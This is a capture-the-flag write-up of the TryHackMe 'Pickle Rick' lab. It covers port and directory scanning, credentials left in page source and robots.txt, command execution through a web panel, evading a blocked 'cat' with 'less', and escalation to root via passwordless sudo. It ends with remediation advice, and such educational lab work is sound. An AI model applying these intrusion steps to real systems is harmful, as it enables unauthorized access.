# Target: Pickle Rick

**Platform:** TryHackMe
[Pickle Rick on TryHackMe](https://tryhackme.com/room/picklerick)

| Target Name | IP Address | OS | Difficulty |
| --- | --- | --- | --- |
| Pickle Rick | 10.64.159.119 | Linux | Easy |

---

## Phase 1: Reconnaissance & Enumeration

I started my reconnaissance by using the `nmap` command on this machine to check what ports were open.

**Nmap Scan:**

```bash
nmap -p- -vv 10.64.159.119

```

```text
Scanned at 2026-01-23 11:19:07 CET for 114s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 62
80/tcp open  http    syn-ack ttl 62

```

The scan showed me that ports 22 (SSH) and 80 (HTTP) were open. I noticed that on port 80 there must be a web page, so I entered the IP address in the browser and it showed me a page with an instruction from Rick asking Morty for help to find three secret ingredients. When I checked the Page Source, I found a hidden note in the HTML code containing the username: `R1ckRul3s`.

To find hidden pages, I decided to use the `gobuster` tool.

**Directory Brute-forcing:**

```bash
gobuster dir -u 10.64.159.119 -w /usr/share/wordlists/dirb/common.txt

```

```text
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/assets               (Status: 301) [Size: 315] [--> http://10.64.159.119/assets/]
/index.html           (Status: 200) [Size: 1062]
/robots.txt           (Status: 200) [Size: 17]
/server-status        (Status: 403) [Size: 278]

```

The pages `index.html` and `robots.txt` were quite interesting, so I opened them in the browser. The `robots.txt` page contained only the text `Wubbalubbadubdub`. My hypothesis was that this could be the password to log in. I searched for the login page in the browser at `/login.php` and it successfully showed me the login form.

## Phase 2: Initial Foothold (Gaining Access)

**Gaining Access via Web Portal:**
I typed the username `R1ckRul3s` and the password `Wubbalubbadubdub`. By using these credentials, I gained access to the Rick Portal.

## Phase 3: Privilege Escalation & Post-Exploitation

There was a 'Command Panel' with Linux working on the website, so I used it to list the files in the current directory.

**Local Enumeration & First Ingredient:**

```bash
ls -la

```

```text
total 40
drwxr-xr-x 3 root   root   4096 Feb 10  2019 .
drwxr-xr-x 3 root   root   4096 Feb 10  2019 ..
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 Sup3rS3cretPickl3Ingred.txt
drwxrwxr-x 2 ubuntu ubuntu 4096 Feb 10  2019 assets
-rwxr-xr-x 1 ubuntu ubuntu   54 Feb 10  2019 clue.txt
-rwxr-xr-x 1 ubuntu ubuntu 1105 Feb 10  2019 denied.php
-rwxrwxrwx 1 ubuntu ubuntu 1062 Feb 10  2019 index.html
-rwxr-xr-x 1 ubuntu ubuntu 1438 Feb 10  2019 login.php
-rwxr-xr-x 1 ubuntu ubuntu 2044 Feb 10  2019 portal.php
-rwxr-xr-x 1 ubuntu ubuntu   17 Feb 10  2019 robots.txt

```

I tried to open the file `Sup3rS3cretPickl3Ingred.txt` with the `cat` command, but I got an error showing that the command is blocked. I decided to open the page of this file directly in the browser, which worked and showed me the first ingredient: `mr. meeseek hair`.

**Finding the Second Ingredient:**
There were no other files containing the ingredients, so I searched the `/home` directory.

```bash
ls -la /home/rick

```

```text
total 12
drwxrwxrwx 2 root root 4096 Feb 10  2019 .
drwxr-xr-x 4 root root 4096 Feb 10  2019 ..
-rwxrwxrwx 1 root root   13 Feb 10  2019 second ingredients

```

To read the file named `second ingredients`, I used the `less` command instead of the blocked `cat` command, and I used quotes `""` to ensure the system could read the space in the file name correctly.

```bash
less "/home/rick/second ingredients"

```

This revealed the second ingredient: `1 jerry tear`.

**Privilege Escalation & Third Ingredient:**
I wanted to look into the `/root` directory, so I checked my permissions.

```bash
sudo -l

```

```text
Matching Defaults entries for www-data on ip-10-64-159-119:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ip-10-64-159-119:
    (ALL) NOPASSWD: ALL

```

This output showed that I had admin permissions. I used `sudo` to list the files in the root directory and look for the final ingredient.

```bash
sudo ls -la /root

```

```text
total 36
drwx------  4 root root 4096 Jul 11  2024 .
drwxr-xr-x 23 root root 4096 Jan 23 10:12 ..
-rw-------  1 root root  168 Jul 11  2024 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
-rw-r--r--  1 root root  161 Jan  2  2024 .profile
drwx------  2 root root 4096 Feb 10  2019 .ssh
-rw-------  1 root root  702 Jul 11  2024 .viminfo
-rw-r--r--  1 root root   29 Feb 10  2019 3rd.txt
drwxr-xr-x  4 root root 4096 Jul 11  2024 snap

```

I checked the `3rd.txt` file using `sudo less`.

```bash
sudo less /root/3rd.txt

```

It showed me the text `3rd ingredients: fleeb juice`, which allowed me to complete the room.

## Conclusion & Takeaways

**Summary:** The entry to this machine was available by open port 80, and the notes were hidden in the obvious places.

**What I Learned:** * **Source Code Inspection:** The importance of always checking HTML source code and `robots.txt` for hidden comments or leftover credentials.

* **Command Block Bypass:** How to bypass basic blacklisted commands (like `cat`) using alternative file-reading binaries (like `less`).
* **Sudo Misconfigurations:** How easily a system can be compromised if the web service user (`www-data`) is given unlimited `sudo` access without a password.

**Remediation:**
To secure this server and prevent similar attacks, I recommend the following steps:

1. **Remove Sensitive Information:** Ensure that developer notes, usernames, or passwords are removed from the HTML source code and are not stored in publicly accessible files like `robots.txt`.
2. **Secure or Remove the Command Panel:** The web application allows direct command execution. This feature should be entirely removed in a production environment, or strictly protected against unauthorized access and command injection.
3. **Restrict Sudo Permissions:** The `www-data` user should operate under the principle of least privilege. Remove the `(ALL) NOPASSWD: ALL` entry from the `sudoers` file to prevent the web service account from executing commands as root.
